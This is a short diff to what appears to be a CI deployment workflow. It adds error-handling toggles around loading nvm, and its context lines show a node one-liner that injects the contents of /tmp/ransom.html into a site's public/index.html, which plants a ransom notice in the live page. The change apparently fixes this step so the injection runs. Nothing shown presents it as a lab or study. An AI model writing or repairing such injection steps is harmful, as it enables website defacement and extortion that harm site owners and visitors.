@@ -117,7 +117,9 @@ jobs:
             
             # Find Node.js (installed via NVM) and execute the injection script
             export NVM_DIR="$HOME/.nvm"
+            set +e
             [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
+            set -e
             
             # The ubuntu user owns the file, so we don't need sudo for node.
             node -e "const fs = require('fs'); let data = fs.readFileSync('public/index.html', 'utf8'); const ransom = fs.readFileSync('/tmp/ransom.html', 'utf8'); data = data.replace('</body>', ransom + '\n  </body>'); fs.writeFileSync('public/index.html', data);"
